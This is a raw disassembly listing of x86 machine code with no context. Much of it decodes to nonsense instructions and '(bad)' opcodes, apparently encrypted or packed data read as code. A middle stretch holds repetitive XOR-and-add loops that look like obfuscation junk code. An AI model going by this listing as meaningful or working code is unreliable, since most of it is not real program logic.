  41aea3:	rcr    BYTE PTR [eax+0x2e],1
  41aea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aea7:	add    eax,0x3e
  41aeaa:	cmp    DWORD PTR [esi-0x1a495362],eax
  41aeb0:	sbb    ebx,DWORD PTR [ecx+esi*1]
  41aeb3:	mov    dh,0x64
  41aeb5:	push   cs
  41aeb6:	jmp    0x41af28
  41aeb8:	loopne 0x41af20
  41aeba:	xor    DWORD PTR [edx-0x53db0b4e],esi
  41aec0:	stos   BYTE PTR es:[edi],al
  41aec1:	sbb    ah,ah
  41aec3:	push   ax
  41aec5:	icebp  
  41aec6:	gs mov ch,0xfa
  41aec9:	bnd jmp 0x41ae50
  41aecc:	mov    ecx,?
  41aece:	pop    ebx
  41aecf:	rcl    BYTE PTR [edx-0x6850b142],1
  41aed5:	push   ds
  41aed6:	push   esi
  41aed7:	push   edi
  41aed8:	mov    eax,0xc6be0b30
  41aedd:	int    0xb5
  41aedf:	dec    esp
  41aee0:	xchg   esi,eax
  41aee1:	inc    esp
  41aee2:	hlt    
  41aee3:	pop    ds
  41aee4:	dec    esi
  41aee5:	mov    esi,0x45e54cd0
  41aeea:	add    eax,0x2a5079e9
  41aeef:	ficomp WORD PTR [ebx+0x1b43e4ef]
  41aef5:	jnp    0x41ae8a
  41aef7:	das    
  41aef8:	jl     0x41ae84
  41aefa:	dec    esp
  41aefb:	std    
  41aefc:	(bad)  
  41aefd:	shl    BYTE PTR [eax],0xd7
  41af00:	mov    esi,0xa742d805
  41af05:	rcr    DWORD PTR [esi+0x1a],0x70
  41af09:	xor    al,0x56
  41af0b:	dec    ebx
  41af0c:	test   al,0x67
  41af0e:	dec    edx
  41af0f:	arpl   WORD PTR [ebx-0x45],di
  41af12:	jmp    FWORD PTR [ecx]
  41af14:	pop    eax
  41af15:	pop    ebp
  41af16:	mov    ch,0xf4
  41af18:	or     DWORD PTR [eax],edi
  41af1a:	int3   
  41af1b:	inc    ebp
  41af1c:	out    0x4b,al
  41af1e:	adc    esp,DWORD PTR [eax]
  41af20:	jae    0x41aee6
  41af22:	dec    ebp
  41af23:	(bad)  
  41af24:	push   edx
  41af25:	mov    gs,WORD PTR [ebx-0x2bfe2b0f]
  41af2b:	mov    DWORD PTR [ecx],esi
  41af2d:	dec    edx
  41af2e:	lods   eax,DWORD PTR ds:[esi]
  41af2f:	outs   dx,DWORD PTR ds:[esi]
  41af30:	pop    es
  41af31:	add    BYTE PTR [ebp-0x14b121f7],cl
  41af37:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41af39:	and    esp,ebx
  41af3b:	jns    0x41af68
  41af3d:	mov    ch,ah
  41af3f:	sar    DWORD PTR [esi+ebp*8+0x3f8b7366],1
  41af46:	xor    BYTE PTR [esi],ah
  41af48:	out    0xdd,al
  41af4a:	cmp    al,0x62
  41af4c:	mov    al,ds:0xc988a1ba
  41af51:	pushf  
  41af52:	inc    ecx
  41af53:	outs   dx,BYTE PTR ds:[esi]
  41af54:	mov    ch,0x9c
  41af56:	fdivr  st(0),st
  41af58:	pop    ebx
  41af59:	xor    BYTE PTR [esp+esi*2],dh
  41af5c:	enter  0xa8fe,0x16
  41af60:	(bad)  
  41af61:	pop    ds
  41af62:	push   esi
  41af63:	or     DWORD PTR [eax-0x3b],esp
  41af66:	mov    cl,0x63
  41af68:	add    eax,0xade49eb9
  41af6d:	jbe    0x41af39
  41af6f:	cmp    bh,ah
  41af71:	inc    ecx
  41af72:	sub    BYTE PTR [ebx-0x70b976b5],ah
  41af78:	fs jne 0x41afca
  41af7b:	mov    eax,0x457913fa
  41af80:	or     al,0x61
  41af82:	lods   al,BYTE PTR ds:[esi]
  41af83:	js     0x41afe8
  41af85:	pop    es
  41af86:	idiv   BYTE PTR [ebx]
  41af88:	and    edi,DWORD PTR [edx+0x2a6c5289]
  41af8e:	adc    BYTE PTR [eax+0x51],ah
  41af91:	inc    ecx
  41af92:	sub    DWORD PTR [ebp+0x35],ebp
  41af95:	xchg   ecx,eax
  41af96:	adc    eax,0xd8d55fa9
  41af9b:	sar    BYTE PTR [esi],1
  41af9d:	jb     0x41afe8
  41af9f:	in     eax,dx
  41afa0:	push   eax
  41afa1:	sub    al,dh
  41afa3:	mov    gs,WORD PTR [ecx-0x7]
  41afa6:	pop    esp
  41afa7:	xor    al,0x89
  41afa9:	icebp  
  41afaa:	push   ecx
  41afab:	stc    
  41afac:	out    dx,al
  41afad:	push   ebx
  41afae:	nop
  41afaf:	mov    ah,0x23
  41afb1:	xor    eax,0xb4718f90
  41afb6:	mov    dl,0xf
  41afb8:	js     0x41b00d
  41afba:	inc    esp
  41afbb:	aad    0xf0
  41afbd:	pop    esp
  41afbe:	cmc    
  41afbf:	adc    BYTE PTR [edi+ebx*2+0x39c1dd7c],ah
  41afc6:	xchg   edx,eax
  41afc7:	jmp    0x404aae4e
  41afcc:	xchg   edx,eax
  41afcd:	les    edx,FWORD PTR [ecx]
  41afcf:	sar    DWORD PTR [edx],0x91
  41afd2:	(bad)  
  41afd4:	or     al,0x4e
  41afd6:	test   al,0x6e
  41afd8:	ror    DWORD PTR [di-0x4d],0xfe
  41afdd:	cli    
  41afde:	sub    edx,DWORD PTR [ecx]
  41afe0:	push   ebx
  41afe1:	push   esp
  41afe2:	mov    cl,0x24
  41afe4:	jle    0x41b024
  41afe6:	imul   ecx,DWORD PTR [edx+esi*4],0xffffff96
  41afea:	lods   al,BYTE PTR ds:[esi]
  41afeb:	add    BYTE PTR [ebx-0x7a58ed2e],ah
  41aff1:	loopne 0x41af9d
  41aff3:	imul   eax,edi,0x97b0a227
  41aff9:	xor    ah,BYTE PTR [ebx-0x34]
  41affc:	fs mov dh,0xe5
  41afff:	cwde   
  41b000:	or     eax,0x3ce0c479
  41b005:	jno    0x41afd7
  41b007:	jbe    0x41afa2
  41b009:	xchg   esi,eax
  41b00a:	or     al,0x76
  41b00c:	jle    0x41afac
  41b00e:	cmp    bl,BYTE PTR [ecx+0x284c40c8]
  41b014:	test   eax,0x9165270e
  41b019:	stos   BYTE PTR es:[edi],al
  41b01a:	dec    ebp
  41b01b:	cmp    al,0xa6
  41b01d:	xchg   edi,eax
  41b01e:	dec    esp
  41b01f:	push   0xffffff80
  41b021:	xor    BYTE PTR [esi],dl
  41b023:	daa    
  41b024:	jmp    0x9bc22cff
  41b029:	out    0xee,al
  41b02b:	mov    eax,0x9caf8301
  41b030:	enter  0x618f,0x92
  41b034:	test   ch,bl
  41b036:	ficom  WORD PTR [edi+edx*8-0x19ca69fd]
  41b03d:	or     DWORD PTR [ecx+0x78f21973],edx
  41b043:	ins    BYTE PTR es:[edi],dx
  41b044:	cmp    edx,DWORD PTR [ebx-0x3437f3fd]
  41b04a:	cmp    esp,DWORD PTR [esi-0x66]
  41b04d:	xchg   edx,eax
  41b04e:	adc    bh,ah
  41b050:	mov    edx,DWORD PTR [ebp-0x14]
  41b053:	mov    DWORD PTR [ebp+0x8],edx
  41b056:	jmp    0x41b0cb
  41b05b:	mov    edx,DWORD PTR [ebp+0x8]
  41b05e:	mov    ebx,DWORD PTR [ebp-0x8]
  41b061:	xor    edx,eax
  41b063:	xor    ebx,eax
  41b065:	sub    edx,ebx
  41b067:	sub    edx,esi
  41b069:	xor    edx,eax
  41b06b:	mov    DWORD PTR [ebp+0x8],edx
  41b06e:	mov    edx,DWORD PTR [ebp+0x8]
  41b071:	mov    ebx,DWORD PTR [ebp-0x58]
  41b074:	add    edx,0x5708f1
  41b07a:	imul   edx,ebx
  41b07d:	mov    DWORD PTR [ebp-0x58],edx
  41b080:	mov    edx,DWORD PTR [ebp+0x8]
  41b083:	mov    ebx,DWORD PTR [ebp-0x54]
  41b086:	add    edx,0x64f893
  41b08c:	or     edx,ebx
  41b08e:	mov    DWORD PTR [ebp-0x54],edx
  41b091:	mov    edx,DWORD PTR [ebp+0x8]
  41b094:	mov    ebx,DWORD PTR [ebp-0x50]
  41b097:	add    edx,ecx
  41b099:	xor    edx,ebx
  41b09b:	mov    DWORD PTR [ebp-0x50],edx
  41b09e:	mov    edx,DWORD PTR [ebp+0x8]
  41b0a1:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b0a4:	add    edx,edi
  41b0a6:	and    edx,ebx
  41b0a8:	mov    DWORD PTR [ebp-0x4c],edx
  41b0ab:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ae:	mov    ebx,DWORD PTR [ebp-0x48]
  41b0b1:	lea    edx,[ebx+edx*1+0x241fcde]
  41b0b8:	mov    DWORD PTR [ebp-0x48],edx
  41b0bb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0be:	mov    ebx,0xfa5e1521
  41b0c3:	sub    ebx,edx
  41b0c5:	add    ebx,DWORD PTR [ebp-0x44]
  41b0c8:	mov    DWORD PTR [ebp-0x44],ebx
  41b0cb:	mov    edx,DWORD PTR [ebp+0x8]
  41b0ce:	xor    edx,eax
  41b0d0:	add    edx,esi
  41b0d2:	jne    0x41b05b
  41b0d8:	mov    edx,DWORD PTR [ebp-0x14]
  41b0db:	mov    DWORD PTR [ebp+0x8],edx
  41b0de:	jmp    0x41b153
  41b0e3:	mov    edx,DWORD PTR [ebp+0x8]
  41b0e6:	mov    ebx,DWORD PTR [ebp-0x8]
  41b0e9:	xor    edx,eax
  41b0eb:	xor    ebx,eax
  41b0ed:	sub    edx,ebx
  41b0ef:	sub    edx,esi
  41b0f1:	xor    edx,eax
  41b0f3:	mov    DWORD PTR [ebp+0x8],edx
  41b0f6:	mov    edx,DWORD PTR [ebp+0x8]
  41b0f9:	mov    ebx,DWORD PTR [ebp-0x58]
  41b0fc:	add    edx,0x5708f1
  41b102:	imul   edx,ebx
  41b105:	mov    DWORD PTR [ebp-0x58],edx
  41b108:	mov    edx,DWORD PTR [ebp+0x8]
  41b10b:	mov    ebx,DWORD PTR [ebp-0x54]
  41b10e:	add    edx,0x64f893
  41b114:	or     edx,ebx
  41b116:	mov    DWORD PTR [ebp-0x54],edx
  41b119:	mov    edx,DWORD PTR [ebp+0x8]
  41b11c:	mov    ebx,DWORD PTR [ebp-0x50]
  41b11f:	add    edx,ecx
  41b121:	xor    edx,ebx
  41b123:	mov    DWORD PTR [ebp-0x50],edx
  41b126:	mov    edx,DWORD PTR [ebp+0x8]
  41b129:	mov    ebx,DWORD PTR [ebp-0x4c]
  41b12c:	add    edx,edi
  41b12e:	and    edx,ebx
  41b130:	mov    DWORD PTR [ebp-0x4c],edx
  41b133:	mov    edx,DWORD PTR [ebp+0x8]
  41b136:	mov    ebx,DWORD PTR [ebp-0x48]
  41b139:	lea    edx,[ebx+edx*1+0x241fcde]
  41b140:	mov    DWORD PTR [ebp-0x48],edx
  41b143:	mov    edx,DWORD PTR [ebp+0x8]
  41b146:	mov    ebx,0xfa5e1521
  41b14b:	sub    ebx,edx
  41b14d:	add    ebx,DWORD PTR [ebp-0x44]
  41b150:	mov    DWORD PTR [ebp-0x44],ebx
  41b153:	mov    edx,DWORD PTR [ebp+0x8]
  41b156:	xor    edx,eax
  41b158:	add    edx,esi
  41b15a:	jne    0x41b0e3
  41b160:	mov    edx,DWORD PTR [ebp-0x8]
  41b163:	mov    ebx,DWORD PTR [ebp-0xc]
  41b166:	xor    edx,eax
  41b168:	lea    edx,[edx+ebx*1+0x3272ec]
  41b16f:	mov    DWORD PTR [ebp-0xc],edx
  41b172:	mov    edx,DWORD PTR [ebp-0x10]
  41b175:	xor    edx,eax
  41b177:	add    edx,esi
  41b179:	jne    0x411e2e
  41b17f:	jmp    0x41d637
  41b184:	mov    ecx,DWORD PTR [ebp-0x14]
  41b187:	mov    DWORD PTR [ebp+0x8],ecx
  41b18a:	jmp    0x41b203
  41b18f:	mov    ecx,DWORD PTR [ebp+0x8]
  41b192:	mov    edx,DWORD PTR [ebp-0x8]
  41b195:	xor    ecx,eax
  41b197:	xor    edx,eax
  41b199:	sub    ecx,edx
  41b19b:	sub    ecx,esi
  41b19d:	xor    ecx,eax
  41b19f:	mov    DWORD PTR [ebp+0x8],ecx
  41b1a2:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1a5:	mov    edx,DWORD PTR [ebp-0x58]
  41b1a8:	add    ecx,0x5708f1
  41b1ae:	imul   ecx,edx
  41b1b1:	mov    DWORD PTR [ebp-0x58],ecx
  41b1b4:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1b7:	mov    edx,DWORD PTR [ebp-0x54]
  41b1ba:	add    ecx,0x64f893
  41b1c0:	or     ecx,edx
  41b1c2:	mov    DWORD PTR [ebp-0x54],ecx
  41b1c5:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1c8:	mov    edx,DWORD PTR [ebp-0x50]
  41b1cb:	add    ecx,0x242ebcc
  41b1d1:	xor    ecx,edx
  41b1d3:	mov    DWORD PTR [ebp-0x50],ecx
  41b1d6:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1d9:	mov    edx,DWORD PTR [ebp-0x4c]
  41b1dc:	add    ecx,edi
  41b1de:	and    ecx,edx
  41b1e0:	mov    DWORD PTR [ebp-0x4c],ecx
  41b1e3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1e6:	mov    edx,DWORD PTR [ebp-0x48]
  41b1e9:	lea    ecx,[edx+ecx*1+0x241fcde]
  41b1f0:	mov    DWORD PTR [ebp-0x48],ecx
  41b1f3:	mov    ecx,DWORD PTR [ebp+0x8]
  41b1f6:	mov    edx,0xfa5e1521
  41b1fb:	sub    edx,ecx
  41b1fd:	add    edx,DWORD PTR [ebp-0x44]
  41b200:	mov    DWORD PTR [ebp-0x44],edx
  41b203:	mov    ecx,DWORD PTR [ebp+0x8]
  41b206:	xor    ecx,eax
  41b208:	add    ecx,esi
  41b20a:	jne    0x41b18f
  41b210:	jmp    0x41d643
  41b215:	mov    ecx,DWORD PTR [ebp+0x8]
  41b218:	mov    edx,DWORD PTR [ebp-0x8]
  41b21b:	xor    ecx,eax
  41b21d:	xor    edx,eax
  41b21f:	sub    ecx,edx
  41b221:	sub    ecx,esi
  41b223:	xor    ecx,eax
  41b225:	mov    DWORD PTR [ebp+0x8],ecx
  41b228:	mov    ecx,DWORD PTR [ebp+0x8]
  41b22b:	mov    edx,DWORD PTR [ebp-0x58]
  41b22e:	add    ecx,0x5708f1
  41b234:	imul   ecx,edx
  41b237:	mov    DWORD PTR [ebp-0x58],ecx
  41b23a:	mov    ecx,DWORD PTR [ebp+0x8]
  41b23d:	mov    edx,DWORD PTR [ebp-0x54]
  41b240:	add    ecx,0x64f893
  41b246:	or     ecx,edx
  41b248:	mov    DWORD PTR [ebp-0x54],ecx
  41b24b:	mov    ecx,DWORD PTR [ebp+0x8]
  41b24e:	mov    edx,DWORD PTR [ebp-0x50]
  41b251:	add    ecx,0x242ebcc
  41b257:	xor    ecx,edx
  41b259:	mov    DWORD PTR [ebp-0x50],ecx
  41b25c:	mov    ecx,DWORD PTR [ebp+0x8]
  41b25f:	mov    edx,DWORD PTR [ebp-0x4c]
  41b262:	add    ecx,edi
  41b264:	and    ecx,edx
  41b266:	mov    DWORD PTR [ebp-0x4c],ecx
  41b269:	mov    ecx,DWORD PTR [ebp+0x8]
  41b26c:	mov    edx,DWORD PTR [ebp-0x48]
  41b26f:	jmp    0x41d610
  41b274:	enter  0x7064,0x8f
  41b278:	sar    BYTE PTR [ebx+0x7b],0x1b
  41b27c:	add    al,0xea
  41b27e:	sbb    DWORD PTR [ecx],0x6fd3bc99
  41b284:	mov    dh,0xf0
  41b286:	jge    0x41b302
  41b288:	(bad)  
  41b289:	pop    edi
  41b28a:	jp     0x41b306
  41b28c:	outs   dx,BYTE PTR ds:[esi]
  41b28d:	test   eax,0xb02bd5af
  41b292:	push   ss
  41b293:	jo     0x41b2f6
  41b295:	lea    ecx,[edi+0x1d]
  41b298:	sbb    esi,DWORD PTR [esi-0x42eb732b]
  41b29e:	in     al,dx
  41b29f:	sbb    DWORD PTR [ebp+0x7728398a],0x6
  41b2a6:	add    WORD PTR [edi+edi*4],0x56
  41b2ab:	imul   esp,DWORD PTR [ebx+0x6e650dbc],0xd7d3488c
  41b2b5:	push   eax
  41b2b6:	lahf   
  41b2b7:	cld    
  41b2b8:	jmp    0x5fbc:0x95527f39
  41b2bf:	dec    ah
  41b2c1:	push   0xd6fdc03b
  41b2c6:	fld    st(6)
  41b2c8:	retf   
  41b2c9:	inc    eax
  41b2ca:	es xor eax,0x1fc74dd4
  41b2d0:	xor    BYTE PTR ds:0x480731ac,0xe3
  41b2d7:	and    DWORD PTR [edx],ebx
  41b2d9:	fnstenv [esi+0x4cf0c41e]
  41b2df:	jp     0x41b301
  41b2e1:	xor    DWORD PTR [ebp+0x1571bb90],0xd23fe8b0
  41b2eb:	jp     0x41b2a4
  41b2ed:	repz sti 
  41b2ef:	(bad)  
  41b2f0:	iret   
  41b2f1:	test   BYTE PTR [ebx-0x631be663],cl
  41b2f7:	xor    al,0xb8
  41b2f9:	cld    
  41b2fa:	lahf   
  41b2fb:	enter  0x5b32,0xf
  41b2ff:	adc    edx,DWORD PTR ds:0xd4338796
  41b305:	jmp    0x41b37d
  41b307:	sub    al,0xfa
  41b309:	push   0x9f32e37e
  41b30e:	cmp    DWORD PTR [ecx-0x29970eab],eax
  41b314:	cmp    eax,0x43fb56e9
  41b319:	(bad)  
  41b31a:	sub    DWORD PTR [ecx-0x5b],esp
  41b31d:	inc    ebx
  41b31e:	data16 jne 0x41b34b
  41b321:	dec    eax
  41b322:	cmp    edi,ecx
  41b324:	dec    ebp
  41b325:	pop    eax
  41b326:	mov    esp,0x9148d472
  41b32b:	pushf  
  41b32c:	les    ebx,FWORD PTR [eax-0x3e2947c7]
  41b332:	cli    
  41b333:	fst    DWORD PTR [edx]
  41b335:	mov    bh,0x3f
  41b337:	ins    BYTE PTR es:[edi],dx
  41b338:	cli    
  41b339:	in     eax,0x5f
  41b33b:	retf   0x3d23
  41b33e:	iret   
  41b33f:	inc    eax
  41b340:	jge    0x41b3a3
  41b342:	or     BYTE PTR [ecx+eax*8],dl
  41b345:	mov    ds:0xdb88f3eb,al
  41b34a:	or     ecx,DWORD PTR [ebx-0x5a3a5632]
  41b350:	cli    
  41b351:	mov    ebx,esi
  41b353:	icebp  
  41b354:	loop   0x41b303
  41b356:	pop    ss
  41b357:	sbb    al,0xd9
  41b359:	aas    
  41b35a:	xor    eax,DWORD PTR [edi+0x4b5d5953]
  41b360:	into   
  41b361:	inc    ecx
  41b362:	shl    DWORD PTR [eax+0x8],0xd4
  41b366:	iret   
  41b367:	je     0x41b323
  41b369:	inc    ebp
  41b36a:	mov    ebp,0x26ec1b12
  41b36f:	cmp    al,0xa3
  41b371:	shl    BYTE PTR [esi+0x9],0x5b
  41b375:	mov    ds:0x5a8de9fa,al
  41b37a:	mov    BYTE PTR [ebp+0x75],dh
  41b37d:	mov    cs,ebp
  41b37f:	scas   eax,DWORD PTR es:[edi]
  41b380:	fadd   st(1),st
  41b382:	rol    bl,1
  41b384:	imul   ebp,DWORD PTR [edi],0x693a5921
  41b38a:	test   DWORD PTR [ebx+0x43],ecx
  41b38d:	sar    DWORD PTR [ecx-0xc75417b],1
  41b393:	sahf   
  41b394:	inc    esi
  41b395:	adc    al,0x92
  41b397:	mov    fs,WORD PTR [eax-0x2614749e]
  41b39d:	and    DWORD PTR ds:0xa7eac187,ebx
  41b3a3:	inc    edi
  41b3a4:	sub    cl,BYTE PTR [eax]
  41b3a6:	aaa    
  41b3a7:	outs   dx,BYTE PTR ds:[esi]
  41b3a8:	cli    
  41b3a9:	js     0x41b39c
  41b3ab:	pushf  
  41b3ac:	and    esp,DWORD PTR [eax-0x6a1d3164]
  41b3b2:	ret    0xe7b7
  41b3b5:	sbb    eax,0x241e2d7f
  41b3ba:	add    eax,0xe801d111
  41b3bf:	adc    esi,DWORD PTR ds:0xff98124a
  41b3c5:	mov    ah,0xf
  41b3c7:	(bad)  
  41b3c8:	aad    0x13
  41b3ca:	adc    DWORD PTR [ebx],ecx
  41b3cc:	jmp    0x9510:0xc2f794ce
  41b3d3:	mov    eax,ds:0x5d8192ec
  41b3d8:	or     bh,BYTE PTR [ebp+0x6f]
  41b3db:	sub    ecx,edx
  41b3dd:	int    0x98
  41b3df:	adc    dh,BYTE PTR [esi]
  41b3e1:	loopne 0x41b45c
  41b3e3:	xor    eax,0xae4b64ff
  41b3e8:	add    DWORD PTR [ebp+0x24],edx
  41b3eb:	pop    edi
  41b3ec:	aaa    
  41b3ed:	addr16 rcl bl,0x68
  41b3f1:	mov    DWORD PTR [ecx],edx
  41b3f3:	mov    ebx,0x812190b1
  41b3f9:	mov    ah,0x64
  41b3fb:	mov    edi,ecx
  41b3fd:	cli    
  41b3fe:	ins    DWORD PTR es:[edi],dx
  41b3ff:	mov    ds:0xcc42f9cb,eax
  41b404:	jne    0x41b46b
  41b406:	stc    
  41b407:	retf   0x3726
  41b40a:	adc    cl,dh
  41b40c:	dec    ebx
  41b40d:	(bad)  
  41b40e:	sub    al,0xc
  41b410:	fiadd  DWORD PTR [edx]
  41b412:	push   0xffffffa2
  41b414:	xor    DWORD PTR [eax+0x3071a62f],ebx
  41b41a:	in     ax,dx
  41b41c:	jo     0x41b48c
  41b41e:	mov    DWORD PTR [edi],edi
  41b420:	adc    bh,cl
  41b422:	out    dx,eax
  41b423:	mov    dl,0xe5
  41b425:	fisubr DWORD PTR [eax+0x3f]
  41b428:	es mov esp,0x33235dad
  41b42e:	in     eax,0xb7
  41b430:	and    BYTE PTR [esi-0x33315353],ch
  41b436:	out    dx,eax
  41b437:	test   BYTE PTR [ebp-0x58],cl
  41b43a:	lahf   
  41b43b:	inc    ebx
  41b43c:	lods   al,BYTE PTR ds:[esi]
  41b43d:	rcl    BYTE PTR [ecx+edi*2-0x7217d03a],0x3f
  41b445:	add    ecx,ecx
  41b447:	test   eax,0xf49852a0
  41b44c:	cmp    BYTE PTR [edx-0x2631a7d3],bl
  41b452:	add    al,0xeb
  41b454:	daa    
  41b455:	sub    al,0x7c
  41b457:	retf   
  41b458:	inc    ecx
  41b459:	add    BYTE PTR [ebp+ecx*2+0x11],0xb9
  41b45e:	xchg   esi,eax
  41b45f:	loop   0x41b482
  41b461:	cwde   
  41b462:	call   0x5161:0x98030a4d
  41b469:	lock lods eax,DWORD PTR ds:[esi]
  41b46b:	sbb    BYTE PTR [edi],0xe0
  41b46e:	xlat   BYTE PTR ds:[ebx]
  41b46f:	mov    al,ds:0xf779d3a1
  41b474:	js     0x41b42e
  41b476:	(bad)  
  41b477:	out    0xb9,al
  41b479:	ds pop edi
  41b47b:	push   0x95a29312
  41b480:	cwde   
  41b481:	or     ecx,DWORD PTR [esi-0x56dcf6db]
  41b487:	push   ebp
  41b488:	mov    BYTE PTR ss:[ecx+0x1e],dh
  41b48c:	mov    al,ds:0xb1789886
  41b491:	out    0x5e,eax
  41b493:	jae    0x41b4e5
  41b495:	adc    edx,eax
  41b497:	mov    ah,0x7c
  41b499:	js     0x41b4bb
  41b49b:	dec    esi
  41b49c:	inc    ebp
  41b49d:	mov    eax,ds:0xa0f05e39
  41b4a2:	push   ebx
  41b4a3:	sbb    dh,al
  41b4a5:	in     al,0x5d
  41b4a7:	and    dl,BYTE PTR ds:0x6df654f8
  41b4ad:	push   edi
  41b4ae:	mov    eax,0x70a5a2a8
  41b4b3:	xor    BYTE PTR [esi-0x1],bl
  41b4b6:	fst    DWORD PTR [ecx-0x30]
  41b4b9:	xor    dl,bl
  41b4bb:	pop    esi
  41b4bc:	loope  0x41b4b0
  41b4be:	sahf   
  41b4bf:	xor    DWORD PTR ds:0x5345be77,ebp
  41b4c5:	push   ebx
  41b4c6:	ret    
  41b4c7:	xor    edx,esi
  41b4c9:	hlt    
  41b4ca:	sbb    DWORD PTR [eax-0x3e],0x200a0adf
  41b4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4d2:	sub    ebp,DWORD PTR [edi]
  41b4d4:	jns    0x41b4c3
  41b4d6:	push   es
  41b4d7:	pop    ebx
  41b4d8:	pop    ebp
  41b4d9:	(bad)  
  41b4da:	and    eax,0x61c03d5f
  41b4df:	mov    ch,0xef
  41b4e1:	ret    
  41b4e2:	cdq    
  41b4e3:	xchg   ebp,eax
  41b4e4:	add    DWORD PTR [esi+0x42],0x2f4eea01
  41b4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b4ec:	adc    BYTE PTR [esi],cl
  41b4ee:	push   edx
  41b4ef:	push   es
  41b4f0:	pop    edx
  41b4f1:	fdivr  QWORD PTR [edi-0x3a9b5178]
  41b4f7:	mov    ecx,0x4e4072f5
  41b4fc:	sbb    bl,ch
  41b4fe:	jnp    0x41b50d
  41b500:	(bad)  
  41b502:	rcr    BYTE PTR [ecx+0x2b5392ea],0x4b
  41b509:	stos   BYTE PTR es:[edi],al
  41b50a:	pop    ecx
  41b50b:	inc    edx
  41b50c:	cmc    
  41b50d:	push   es
  41b50e:	jp     0x41b49d
  41b510:	pop    ss
  41b511:	mov    dh,0x97
  41b513:	dec    esp
  41b514:	mov    gs:0x6486810d,al
  41b51a:	lea    ebp,ds:0x58ef7790
  41b520:	imul   ebx,DWORD PTR [esi-0x63b00508],0xc2bf8111
  41b52a:	loope  0x41b52d
  41b52c:	dec    ebp
  41b52d:	(bad)  
  41b52e:	ins    BYTE PTR es:[edi],dx
  41b52f:	shl    DWORD PTR [eax-0x13],cl
  41b532:	out    dx,eax
  41b533:	out    0xc2,al
  41b535:	jmp    0x7604:0xccd82531
  41b53c:	stos   DWORD PTR es:[edi],eax
  41b53d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b53e:	push   0xffffffea
  41b540:	call   0x14ed051d
  41b545:	dec    esp
  41b546:	aam    0xeb
  41b548:	cwde   
  41b549:	jae    0x41b4e9
  41b54b:	or     BYTE PTR [esi+0x89c48f4],0x29
  41b552:	stos   BYTE PTR es:[edi],al
  41b553:	loop   0x41b582
  41b555:	fwait
  41b556:	jne    0x41b583
  41b558:	popa   
  41b559:	push   edi
  41b55a:	repnz push bx
  41b55d:	fdiv   DWORD PTR [ecx-0x4]
  41b560:	inc    ecx
  41b561:	sbb    esi,DWORD PTR cs:[edi+ebp*2-0x45d017b5]
  41b569:	pop    eax
  41b56a:	mov    ss,WORD PTR [ecx]
  41b56c:	aaa    
  41b56d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b56f:	jle    0x41b57e
  41b571:	iret   
  41b572:	loope  0x41b57f
  41b574:	imul   esp,DWORD PTR [edx-0x2b6adda2],0x3b
  41b57b:	push   ecx
  41b57c:	jae    0x41b5ba
  41b57e:	mov    edx,DWORD PTR [ebx-0x4aa6ce1c]
  41b584:	jmp    0xda5d:0x25661d34
  41b58b:	test   eax,0x82eaff8a
  41b590:	ret    
  41b591:	sbb    eax,0x6f6d159e
  41b596:	fidiv  DWORD PTR [ebx+ebp*1-0x43]
  41b59a:	in     al,0xf1
  41b59c:	popf   
  41b59d:	enter  0x5bf7,0x4d
  41b5a1:	fsub   st,st(1)
  41b5a3:	mov    ch,0x3c
  41b5a5:	push   cs
  41b5a6:	pop    ecx
  41b5a7:	dec    ebx
  41b5a8:	cmp    al,0x63
  41b5aa:	xchg   cl,dl
  41b5ac:	pop    es
  41b5ad:	pop    eax
  41b5ae:	mov    ebp,0xde22a280
  41b5b3:	inc    eax
  41b5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5b5:	imul   esi,DWORD PTR ds:0x47b8039a,0xffffffb8
  41b5bc:	repz retf 
  41b5be:	mov    al,0x34
  41b5c0:	mov    edx,0xc067a8b3
  41b5c5:	ret    
  41b5c6:	sub    al,0x92
  41b5c8:	jns    0x41b55d
  41b5ca:	aas    
  41b5cb:	das    
  41b5cc:	pusha  
  41b5cd:	and    eax,0x922cb15b
  41b5d2:	ret    0xe824
  41b5d5:	cmp    ebx,ebp
  41b5d7:	pop    dx
  41b5d9:	jecxz  0x41b578
  41b5db:	(bad)  
  41b5dc:	pushf  
  41b5dd:	cmc    
  41b5de:	jbe    0x41b5b5
  41b5e0:	mov    ch,0x78
  41b5e2:	fwait
  41b5e3:	add    ecx,ebx
  41b5e5:	xor    eax,0xaf4bdcfd
  41b5ea:	add    dh,BYTE PTR [edx]
  41b5ec:	outs   dx,BYTE PTR ds:[esi]
  41b5ed:	(bad)  
  41b5ee:	call   0x293a843b
  41b5f3:	xchg   edx,eax
  41b5f4:	and    eax,0x7d0c7803
  41b5f9:	imul   eax,DWORD PTR [esi-0x3d4a6573],0x3d9d59fa
  41b603:	sub    BYTE PTR [ebx],dl
  41b605:	out    dx,al
  41b606:	test   eax,0x82181490
  41b60b:	jmp    0x41b65e
  41b60d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b60e:	out    dx,al
  41b60f:	into   
  41b610:	fdivr  DWORD PTR ds:0xb9c8e282
  41b616:	mov    cl,0xc0
  41b618:	lods   al,BYTE PTR ds:[esi]
  41b619:	(bad)  [ebx-0x73b4e195]
  41b61f:	sub    esp,DWORD PTR [edx+0x49]
  41b622:	jmp    0x41b62c
  41b624:	adc    BYTE PTR fs:[ecx],ah
  41b627:	rcr    ecx,1
  41b629:	cmp    DWORD PTR [edi-0x67],ecx
  41b62c:	cs sub al,0xca
  41b62f:	or     eax,0x655ff058
  41b634:	push   edx
  41b635:	ja     0x41b5c4
  41b637:	dec    esi
  41b638:	mov    ebp,0xe10048b7
  41b63d:	dec    eax
  41b63e:	push   ss
  41b63f:	stos   DWORD PTR es:[edi],eax
  41b640:	mov    ah,0x83
  41b642:	adc    eax,0xdb37bcd0
  41b647:	mul    DWORD PTR [esi-0x28]
  41b64a:	inc    edi
